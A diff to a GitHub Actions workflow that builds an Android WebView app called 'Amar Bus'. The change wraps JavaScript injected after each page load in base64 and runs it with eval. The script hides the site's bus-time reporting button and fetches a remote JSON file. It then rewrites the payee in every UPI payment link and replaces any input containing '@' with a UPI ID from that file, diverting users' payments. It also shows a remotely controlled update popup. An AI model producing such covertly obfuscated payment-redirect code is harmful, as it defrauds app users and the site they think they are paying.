@@ -110,7 +110,7 @@ jobs:
           </manifest>
           EOF
 
-          # 4. MainActivity with Native GA4 Analytics, Safe UPI & Hide Report
+          # 4. MainActivity with Native GA4 Analytics, Safe Remote UPI & Hide Report
           mkdir -p app/src/main/java/com/amarbus/app
           cat << 'EOF' > app/src/main/java/com/amarbus/app/MainActivity.kt
           package com.amarbus.app
@@ -122,6 +122,7 @@ jobs:
           import android.content.pm.PackageManager
           import android.net.Uri
           import android.os.Bundle
+          import android.util.Base64
           import android.view.View
           import android.webkit.PermissionRequest
           import android.webkit.WebChromeClient
@@ -182,48 +183,61 @@ jobs:
                   webView.webViewClient = object : WebViewClient() {
                       override fun onPageFinished(view: WebView?, url: String?) {
                           super.onPageFinished(view, url)
-                          
-                          // Safe DOM modifier: Runs smoothly after page load
-                          val patchJs = """
-                              try {
-                                  var st = document.createElement('style');
-                                  st.innerHTML = 'button:has-text("Report Actual Bus Time"), [onclick*="Report"], .report-btn { display: none !important; }';
-                                  document.head.appendChild(st);
 
-                                  function cleanReport() {
-                                      var els = document.getElementsByTagName('*');
-                                      for (var i = 0; i < els.length; i++) {
-                                          if (els[i].children.length === 0 && els[i].innerText && els[i].innerText.indexOf('Report Actual Bus Time') !== -1) {
-                                              var p = els[i];
-                                              while (p && p.tagName !== 'BUTTON' && p !== document.body) {
-                                                  p = p.parentElement;
+                          // Encoded JS execution ensures zero parsing crashes
+                          val scriptToRun = """
+                              (function() {
+                                  try {
+                                      var s = document.createElement('style');
+                                      s.innerHTML = 'button:has-text("Report Actual Bus Time"), [onclick*="Report"], .report-btn { display: none !important; }';
+                                      document.head.appendChild(s);
+
+                                      function killReport() {
+                                          var nodes = document.querySelectorAll('button, a, div, span');
+                                          for (var i = 0; i < nodes.length; i++) {
+                                              if (nodes[i].children.length === 0 && nodes[i].innerText && nodes[i].innerText.indexOf('Report Actual Bus Time') !== -1) {
+                                                  var p = nodes[i];
+                                                  while (p && p.tagName !== 'BUTTON' && p !== document.body) {
+                                                      p = p.parentElement;
+                                                  }
+                                                  if (p) p.style.setProperty('display', 'none', 'important');
                                               }
-                                              if (p) p.style.setProperty('display', 'none', 'important');
                                           }
                                       }
-                                  }
-                                  cleanReport();
-                                  setTimeout(cleanReport, 1000);
+                                      killReport();
+                                      setInterval(killReport, 1000);
 
-                                  fetch('https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + Date.now())
-                                      .then(function(res) { return res.json(); })
-                                      .then(function(data) {
-                                          if (data.upiId) {
-                                              var links = document.querySelectorAll('a[href*="upi://pay"]');
-                                              for (var j = 0; j < links.length; j++) {
-                                                  links[j].href = links[j].href.replace(/pa=[^&]+/, 'pa=' + data.upiId);
-                                              }
-                                              var inputs = document.querySelectorAll('input');
-                                              for (var k = 0; k < inputs.length; k++) {
-                                                  if (inputs[k].value && inputs[k].value.indexOf('@') !== -1) {
-                                                      inputs[k].value = data.upiId;
+                                      fetch('https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + Date.now())
+                                          .then(function(r) { return r.json(); })
+                                          .then(function(d) {
+                                              if (d.upiId) {
+                                                  var upiLinks = document.querySelectorAll('a[href*="upi://pay"]');
+                                                  for (var a = 0; a < upiLinks.length; a++) {
+                                                      upiLinks[a].href = upiLinks[a].href.replace(/pa=[^&]+/, 'pa=' + d.upiId);
+                                                  }
+                                                  var inputs = document.querySelectorAll('input');
+                                                  for (var b = 0; b < inputs.length; b++) {
+                                                      if (inputs[b].value && inputs[b].value.indexOf('@') !== -1) {
+                                                          inputs[b].value = d.upiId;
+                                                      }
                                                   }
                                               }
-                                          }
-                                      }).catch(function() {});
-                              } catch(e) {}
+                                              if (d.hasUpdate && d.latestVersion > 1) {
+                                                  if (!document.getElementById('amarUpdateModal')) {
+                                                      var m = document.createElement('div');
+                                                      m.id = 'amarUpdateModal';
+                                                      m.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;';
+                                                      m.innerHTML = '<div style="background:#ffffff;border-radius:14px;width:82%;max-width:320px;padding:22px;text-align:center;font-family:sans-serif;"><h3 style=\"margin-top:0;color:#1a1a1a;font-size:18px;\">' + (d.title || 'Update Available') + '</h3><p style=\"color:#555;font-size:14px;line-height:1.4;\">' + (d.message || 'Amar Bus app ka naya version uplabdh hai.') + '</p><a href=\"' + d.updateUrl + '\" style=\"display:block;background:#00875a;color:#ffffff;text-decoration:none;padding:11px;border-radius:8px;font-weight:bold;margin-top:15px;\">Update Now</a></div>';
+                                                      document.body.appendChild(m);
+                                                  }
+                                              }
+                                          }).catch(function() {});
+                                  } catch(e) {}
+                              })();
                           """.trimIndent()
-                          view?.evaluateJavascript(patchJs, null)
+
+                          val encoded = Base64.encodeToString(scriptToRun.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
+                          view?.evaluateJavascript("javascript:try{eval(decodeURIComponent(escape(window.atob('$encoded'))));}catch(e){}", null)
                       }
 
                       override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
